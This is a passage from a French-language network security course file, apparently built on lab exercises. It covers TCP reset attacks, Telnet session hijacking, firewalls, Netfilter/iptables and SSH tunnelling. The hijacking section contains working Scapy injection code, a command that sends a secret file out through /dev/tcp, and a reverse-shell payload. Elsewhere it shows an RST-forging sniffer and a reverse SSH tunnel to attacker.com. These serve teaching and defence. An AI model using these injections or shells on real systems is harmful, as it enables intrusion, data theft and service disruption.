seq=pkt[TCP].ack,     # Le seq RST = ack attendu\n                  dport=pkt[TCP].sport,\n                  sport=pkt[TCP].dport)\n        send(ip/tcp, verbose=0)\n        print(f\"RST envoyé : {pkt[IP].src}:{pkt[TCP].sport} →\" +\n              f\" {pkt[IP].dst}:{pkt[TCP].dport}\")\n\n# Surveiller tout le trafic TCP depuis la victime 10.0.2.68\nsniff(filter=\"tcp and src host 10.0.2.68\", prn=reset_connection)</pre></div>\n\n<div class=\"info-box warn\"><div class=\"ib-title\">Application réelle : Great Firewall de Chine</div>\n<p>La Chine utilise cette technique pour bloquer les connexions TCP indésirables. Quand un paquet suspect est détecté, le pare-feu forge des paquets RST vers les DEUX extrémités — coupant la connexion des deux côtés simultanément. L'utilisateur voit sa connexion se fermer sans explication.</p></div>\n"},
    {id:"s16_hijack",short:"16.4 Session Hijacking",title:"16.4 Détournement de Session TCP",content:"\n<div class=\"prose\">\n<p>Le <strong>détournement de session TCP</strong> (session hijacking) permet à un attaquant d'<strong>injecter des commandes malveillantes</strong> dans une connexion existante entre deux machines — comme si l'attaquant était l'un des participants légitimes.</p>\n</div>\n\n<div class=\"diagram\">\n<div class=\"diagram-title\">Configuration typique pour le détournement de session Telnet</div>\n<div style=\"display:flex;gap:16px;align-items:center;justify-content:center;flex-wrap:wrap\">\n  <div class=\"diag-node\" style=\"text-align:center\">👤 User<br><small>10.0.2.68</small><br><small>Telnet actif</small></div>\n  <div style=\"font-size:1.2rem\">⟷</div>\n  <div class=\"diag-node server\" style=\"text-align:center\">🖥️ Server<br><small>10.0.2.69</small><br><small>Port 23</small></div>\n  <div style=\"font-size:1.2rem;color:var(--red)\">←</div>\n  <div class=\"diag-node attacker\" style=\"text-align:center\">☠️ Attaquant<br><small>10.0.2.70</small><br><small>Écoute le réseau</small></div>\n</div>\n<div style=\"margin-top:12px;font-size:.8rem;color:var(--muted);text-align:center\">\n  L'attaquant est sur le même LAN. Il écoute le trafic telnet pour obtenir seq/ack courants.\n</div>\n</div>\n\n<h3 class=\"sub\">Étapes de l'attaque</h3>\n<div class=\"prose\">\n<ol>\n<li><strong>Sniff</strong> : l'attaquant capture le trafic telnet avec Wireshark pour obtenir :\n  <ul>\n  <li>Ports source/destination</li>\n  <li>Numéro de séquence SEQ actuel (côté user)</li>\n  <li>Numéro d'acquittement ACK actuel</li>\n  </ul>\n</li>\n<li><strong>Injection</strong> : l'attaquant forge un paquet TCP en usurpant l'identité du user, avec le bon numéro de séquence → le serveur l'accepte comme légitime</li>\n<li><strong>Le serveur exécute la commande</strong> injectée et envoie un ACK pour le paquet de l'attaquant</li>\n<li><strong>Deadlock</strong> : le vrai user reçoit un ACK qui ne correspond à rien qu'il a envoyé → confusion, la session se bloque</li>\n</ol>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Détournement de session Telnet (sessionhijack.py)</div>\n<pre>from scapy.all import *\n\n# Ces valeurs sont lues dans Wireshark PENDANT que la session est active :\nUSER_IP   = \"10.0.2.68\"  # IP du vrai utilisateur\nSERVER_IP = \"10.0.2.69\"  # IP du serveur telnet\nUSER_PORT = 46716         # Port source de l'utilisateur (aléatoire)\nSERVER_PORT = 23          # Port telnet\n\n# Ces numéros CHANGENT à chaque échange — les lire au bon moment !\nNEXT_SEQ  = 956606610    # Prochain numéro de séq attendu PAR LE SERVEUR\nNEXT_ACK  = 3791760010   # Prochain numéro d'ack attendu PAR LE SERVEUR\n\n# Forger un paquet comme si c'était l'utilisateur qui l'envoyait\nip  = IP(src=USER_IP, dst=SERVER_IP)\ntcp = TCP(sport=USER_PORT, dport=SERVER_PORT,\n          flags=\"A\",           # ACK (connexion déjà établie)\n          seq=NEXT_SEQ,        # Le bon numéro de séquence\n          ack=NEXT_ACK)\n\n# La commande à injecter (exécutée sur le serveur telnet) :\n# '\\r' = Entrée pour soumettre la commande précédente\n# Exfiltrer le fichier secret vers l'attaquant via /dev/tcp :\nmalicious_cmd = \"\\r cat /home/seed/secret > /dev/tcp/10.0.2.70/9090 \\r\"\n\npkt = ip / tcp / malicious_cmd\nsend(pkt, verbose=0)\nprint(\"Paquet d'injection envoyé !\")\n\n# Sur la machine de l'attaquant AVANT d'exécuter ce script :\n# nc -lv 9090\n# ... attendre le fichier secret !</pre></div>\n\n<h3 class=\"sub\">16.4.5 Reverse Shell via Session Hijacking</h3>\n<div class=\"prose\">\n<p>Au lieu d'exfiltrer un seul fichier, l'attaquant peut injecter une commande qui ouvre un <strong>shell interactif complet</strong> vers sa machine — lui donnant un accès permanent au serveur même après la fermeture de la session telnet légitime.</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Injection de Reverse Shell</div>\n<pre># Commande injectée dans la session telnet :\nreverse_shell = \"\\r /bin/bash -i > /dev/tcp/10.0.2.70/9090 2>&1 0<&1 \\r\"\n\n# Explication détaillée :\n# /bin/bash -i      : lancer bash en mode interactif sur le SERVEUR\n# > /dev/tcp/x/p   : rediriger stdout vers TCP connexion vers attaquant:9090\n# 2>&1             : rediriger stderr (fd=2) vers stdout (= vers attaquant)\n# 0<&1             : rediriger stdin (fd=0) depuis stdout (= depuis attaquant)\n# Résultat : l'attaquant a un CLI complet sur le serveur !\n\n# Sur l'attaquant, AVANT l'injection :\n# nc -lv 9090\n# ... attendre quelques secondes ...\n# Connection from 10.0.2.69 port 9090 accepted\n# seed@Server:~$ _    ← SHELL COMPLET sur le serveur !</pre></div>\n\n<div class=\"info-box danger\"><div class=\"ib-title\">Pourquoi la session légitime se bloque</div>\n<p>Après l'injection réussie, le serveur envoie un ACK pour le numéro de séquence de l'attaquant (NEXT_SEQ + len(payload)). Le vrai utilisateur reçoit cet ACK mais ne reconnaît pas le numéro — il n'a rien envoyé avec ce numéro de séquence. Il envoie donc un RST ou recommence à partir de son ancien état → <strong>deadlock</strong> et la session telnet légitime se fige indéfiniment.</p></div>\n"},
    {id:"s16_sum",short:"16.5 Résumé",title:"16.5 Résumé et Contre-mesures",content:"\n<div class=\"prose\">\n<p>TCP est un protocole essentiel mais sans mécanismes de sécurité intégrés. Les trois attaques étudiées exploitent des faiblesses fondamentales du protocole :</p>\n</div>\n<table class=\"dt\">\n<tr><th>Attaque</th><th>Objectif</th><th>Vecteur</th><th>Contre-mesure principale</th></tr>\n<tr><td><strong>SYN Flooding</strong></td><td>Déni de service</td><td>Saturation de la file half-open</td><td>SYN cookies (RFC 4987)</td></tr>\n<tr><td><strong>TCP Reset</strong></td><td>Coupure de connexion</td><td>Paquet RST falsifié avec bon seq</td><td>Chiffrement (IPsec, TLS)</td></tr>\n<tr><td><strong>Session Hijacking</strong></td><td>Injection de commandes</td><td>Paquet TCP avec bon seq +cmd</td><td>Chiffrement de bout en bout</td></tr>\n</table>\n<div class=\"info-box tip\"><div class=\"ib-title\">Améliorations de sécurité TCP modernes</div>\n<ul>\n<li><strong>TCP SYN cookies</strong> : contre le SYN flooding — activés par défaut dans Linux et Windows</li>\n<li><strong>Randomisation du numéro de séquence initial (ISN)</strong> : rend plus difficile de deviner le bon numéro de séquence</li>\n<li><strong>Randomisation du port source</strong> : réduit la surface d'attaque pour le TCP reset</li>\n<li><strong>TCP MD5 Signature Option (RFC 2385)</strong> : authentifie chaque paquet TCP via HMAC-MD5</li>\n<li><strong>TCP Authentication Option (TCP-AO, RFC 5925)</strong> : remplace TCP MD5, plus robuste</li>\n<li><strong>Chiffrement de la couche réseau (TLS, IPsec)</strong> : la solution définitive</li>\n</ul></div>\n"}
]};
const ch17={id:"ch17",num:17,icon:"\ud83d\udee1\ufe0f",title:"Pare-feu (Firewall)",desc:"Architecture pare-feu, filtres stateless vs stateful vs proxy. Implémentation avec Netfilter (module noyau) et iptables. Contournement via tunnel SSH.",sections:[
    {id:"s17_intro",short:"17.1 Introduction",title:"17.1 Introduction aux Pare-feux",content:"\n<div class=\"prose\">\n<p>Un <strong>pare-feu (firewall)</strong> est un composant matériel ou logiciel qui contrôle le flux de paquets entre des réseaux de niveaux de confiance différents. Il applique une <em>politique de sécurité</em> décidant quels paquets sont autorisés à traverser la frontière réseau.</p>\n<p>Il faut satisfaire trois conditions pour qu'un pare-feu soit vraiment efficace :</p>\n<ol>\n<li>Tout le trafic entre deux zones de confiance différentes doit passer par le pare-feu</li>\n<li>Seul le trafic autorisé par la politique de sécurité peut traverser le pare-feu</li>\n<li>Le pare-feu lui-même doit être impossible à compromettre</li>\n</ol>\n</div>\n<div class=\"diagram\">\n<div class=\"diagram-title\">Position typique du pare-feu dans un réseau</div>\n<div class=\"diag-flow\" style=\"align-items:center\">\n  <div style=\"text-align:center\">\n    <div class=\"diag-node attacker\">Internet<br><small>(Zone non fiable)</small></div>\n  </div>\n  <div class=\"diag-arrow\">→</div>\n  <div style=\"background:rgba(79,142,247,.15);border:2px solid var(--accent);border-radius:10px;padding:10px 16px;text-align:center;font-weight:700;color:var(--accent)\">\n    🛡️ Pare-feu<br><small style=\"font-weight:normal;color:var(--muted)\">Filtre entrant/sortant</small>\n  </div>\n  <div class=\"diag-arrow\">→</div>\n  <div style=\"text-align:center\">\n    <div class=\"diag-node server\">Réseau interne<br><small>(Zone fiable)</small></div>\n  </div>\n</div></div>\n\n<h3 class=\"sub\">Types de contrôle</h3>\n<table class=\"dt\">\n<tr><th>Type</th><th>Description</th><th>Exemple</th></tr>\n<tr><td>Contrôle de service</td><td>Filtre par type de service réseau (protocole, port)</td><td>Bloquer Telnet (port 23), autoriser SSH (22)</td></tr>\n<tr><td>Contrôle de direction</td><td>Distingue le sens du trafic (entrant/sortant)</td><td>Autoriser le HTTP sortant, bloquer le HTTP entrant</td></tr>\n<tr><td>Contrôle utilisateur</td><td>Filtre selon l'identité de l'utilisateur</td><td>Les serveurs peuvent sortir, les postes clients non</td></tr>\n<tr><td>Contrôle behaviour</td><td>Limite les comportements suspects</td><td>Bloquer le spam sortant</td></tr>\n</table>\n"},
    {id:"s17_types",short:"17.2 Types de Pare-feux",title:"17.2 Stateless / Stateful / Proxy",content:"\n<h3 class=\"sub\">17.2.1 Filtre de paquets (Stateless / sans état)</h3>\n<div class=\"prose\">\n<p>Le filtre de paquets est le type le plus simple et le plus rapide. Il prend des décisions basées sur les en-têtes de chaque paquet <strong>individuellement</strong>, sans tenir compte du contexte de la connexion.</p>\n<p>Champs analysés : IP source, IP destination, protocole (TCP/UDP/ICMP), port source, port destination, bits de contrôle TCP (SYN, ACK, RST).</p>\n</div>\n<div class=\"info-box warn\"><div class=\"ib-title\">Limite critique des filtres stateless</div>\n<p>Un filtre stateless ne peut pas distinguer si un paquet TCP appartient à une connexion établie légitimement ou s'il est forgé. Par exemple, un paquet avec le bit <code>ACK</code> activé peut être une vraie réponse HTTP <em>ou</em> un paquet d'attaque spoofé. Le filtre stateless les autorise tous les deux.</p></div>\n\n<h3 class=\"sub\">17.2.2 Pare-feu à états (Stateful)</h3>\n<div class=\"prose\">\n<p>Les pare-feux à états maintiennent une <strong>table de l'état de toutes les connexions</strong>. Pour chaque connexion TCP établie, le pare-feu mémorise : les 4 champs d'identification, l'état (SYN envoyé, ESTABLISHED, FIN attendu), les numéros de séquence.</p>\n<p>Avantage crucial : un paquet ACK n'est accepté que si une connexion correspondante a été établie. Un paquet ACK forgé (attaque RST, hijack) venant de nulle part est rejeté car aucune connexion correspondante n'existe dans la table d'état.</p>\n</div>\n\n<h3 class=\"sub\">17.2.3 Pare-feu Applicatif (Proxy Firewall)</h3>\n<div class=\"prose\">\n<p>Agit comme un <strong>proxy</strong> : la connexion du client se termine au pare-feu, qui établit une nouvelle connexion vers le serveur cible. Il peut donc examiner le contenu de la couche application (URL HTTP, commandes FTP, etc.).</p>\n<ul>\n<li>Inspecte les requêtes HTTP pour bloquer des URL, des mots-clés</li>\n<li>Peut mettre en cache les réponses (web proxy)</li>\n<li>Plus lent mais beaucoup plus sécurisé</li>\n<li>DPI (Deep Packet Inspection) — peut analyser jusqu'au contenu d'un email</li>\n</ul>\n</div>\n"},
    {id:"s17_nf",short:"17.3-9 Netfilter+iptables",title:"17.3-9 Netfilter, iptables et Contournement SSH",content:"\n<div class=\"prose\">\n<p><strong>Netfilter</strong> est le sous-système de filtrage de paquets intégré dans le noyau Linux. Il fournit des <strong>points d'ancrage (hooks)</strong> à cinq endroits stratégiques dans le chemin qu'un paquet parcourt à travers le noyau :</p>\n</div>\n<div class=\"diagram\">\n<div class=\"diagram-title\">Architecture Netfilter dans le noyau Linux</div>\n<div class=\"mem-diagram\">\nRéseau\n  |\n  v\n[NF_INET_PRE_ROUTING]  ← Tout paquet entrant (avant décision routage)\n  |                         \n  +---(routage)---> locale ? \n  |                       |OUI\n  |               [NF_INET_LOCAL_IN]  ← Paquet pour la machine locale\n  |                       |\n  |                 Application locale\n  |\n  | NON (à transférer)\n  v\n[NF_INET_FORWARD]       ← Paquet à transférer vers une autre machine\n  |\n  v\n[NF_INET_POST_ROUTING]  ← Après décision routage, paquet prêt à partir\n  |\n  v\nRéseau\n\n[NF_INET_LOCAL_OUT]     ← Paquets générés par la machine locale</div></div>\n\n<h3 class=\"sub\">Module noyau Netfilter — Filtrage ICMP</h3>\n<div class=\"code-block\"><div class=\"code-label\">Module noyau simple — Bloquer tous les paquets ICMP</div>\n<pre>#include &lt;linux/module.h&gt;\n#include &lt;linux/netfilter.h&gt;\n#include &lt;linux/netfilter_ipv4.h&gt;\n#include &lt;linux/ip.h&gt;\n\n// Fonction de rappel invoquée pour chaque paquet réseau\nstatic unsigned int blockICMP(void *priv,\n                               struct sk_buff *skb,\n                               const struct nf_hook_state *state)\n{\n    struct iphdr *iph = ip_hdr(skb); // Lire l'en-tête IP\n    \n    // Rejeter silencieusement les paquets ICMP\n    if(iph->protocol == IPPROTO_ICMP) {\n        printk(KERN_INFO \"Firewall: ICMP bloqué depuis %pI4\\n\",\n               &iph->saddr);\n        return NF_DROP;   // Jeter le paquet\n    }\n    return NF_ACCEPT;     // Laisser passer tous les autres\n}\n\n// Enregistrement du hook\nstatic struct nf_hook_ops hook_ops = {\n    .hook     = blockICMP,\n    .pf       = PF_INET,                  // IPv4\n    .hooknum  = NF_INET_PRE_ROUTING,      // Point d'ancrage\n    .priority = NF_IP_PRI_FIRST,          // Priorité maximale\n};\n\nstatic int __init hook_init(void) {\n    return nf_register_net_hook(&init_net, &hook_ops);\n}\n\nstatic void __exit hook_exit(void) {\n    nf_unregister_net_hook(&init_net, &hook_ops);\n}\n\nmodule_init(hook_init);\nmodule_exit(hook_exit);\nMODULE_LICENSE(\"GPL\");\n// Compilation : make (avec Makefile noyau approprié)\n// Chargement  : sudo insmod hook.ko\n// Vérification: dmesg | tail    # Voir les paquets bloqués</pre></div>\n\n<h3 class=\"sub\">iptables — Interface utilisateur pour Netfilter</h3>\n<div class=\"code-block\"><div class=\"code-label\">Commandes iptables essentielles</div>\n<pre># ===== LECTURE =====\nsudo iptables -L -n -v          # Lister toutes les règles avec stats\nsudo iptables -L INPUT -n -v    # Lister la chaîne INPUT seulement\n\n# ===== RÈGLES DE BASE =====\n# Bloquer tout trafic depuis une IP :\nsudo iptables -A INPUT -s 10.0.2.68 -j DROP\n# Bloquer les connexions telnet sortantes :\nsudo iptables -A OUTPUT -p tcp --dport 23 -j DROP\n# Autoriser SSH entrant :\nsudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT\n# Bloquer les pings entrants mais autoriser les réponses sortantes :\nsudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP\n\n# ===== POLITIQUE PAR DÉFAUT =====\nsudo iptables -P INPUT DROP    # Par défaut : bloquer (whitelist)\nsudo iptables -P INPUT ACCEPT  # Par défaut : autoriser (blacklist)\n\n# ===== STATEFUL (conntrack) =====\n# Autoriser les réponses aux connexions initiées depuis l'intérieur :\nsudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT\n# Autoriser nouvelles connexions HTTP sortantes :\nsudo iptables -A OUTPUT -p tcp --dport 80 -m conntrack --ctstate NEW -j ACCEPT\n\n# ===== NAT =====\n# MASQUERADE : partager Internet depuis l'interface eth0 (routeur NAT) :\nsudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\nsudo sysctl -w net.ipv4.ip_forward=1\n\n# ===== RÉINITIALISER =====\nsudo iptables -F         # Vider les règles de toutes les chaînes\nsudo iptables -Z         # Remettre les compteurs à zéro</pre></div>\n\n<h3 class=\"sub\">Contournement via Tunnel SSH</h3>\n<div class=\"prose\">\n<p>Si le pare-feu bloque le port 23 (telnet) mais autorise le port 22 (SSH), on peut <strong>tunnéliser</strong> n'importe quel protocole dans SSH :</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Tunnel SSH pour contourner le blocage telnet</div>\n<pre># Sur la machine cliente (où le pare-feu bloque telnet) :\n# Créer un tunnel : port local 8023 → port 23 du serveur cible, via SSH\nssh -L 8023:10.0.2.69:23 user@10.0.2.69 -N -f\n#   -L localport:remotehost:remoteport\n#   -N : ne pas exécuter de commande (tunnel seulement)\n#   -f : passer en arrière-plan\n\n# Se connecter telnet via le tunnel SSH :\ntelnet 127.0.0.1 8023\n# Le trafic telnet est chiffré puis encapsulé dans SSH !\n# Le pare-feu ne voit que du trafic SSH port 22 → autorisé.\n\n# Tunnel inversé (remote port forwarding) :\nssh -R 9090:localhost:22 user@attacker.com\n# Le serveur attacker.com peut maintenant accéder au port 22 de cette machine\n# via son propre port 9090. Utile quand la machine cible est derrière un NAT.</pre></div>\n"}
]};
const ch18={id:"ch18",num:18,icon:"\ud83c\udf10",title:"DNS et Attaques DNS",desc:"Fonctionnement du DNS, résolution itérative, empoisonnement de cache, attaque Kaminsky (2008), DNSSEC, DNS Rebinding.",sections:[
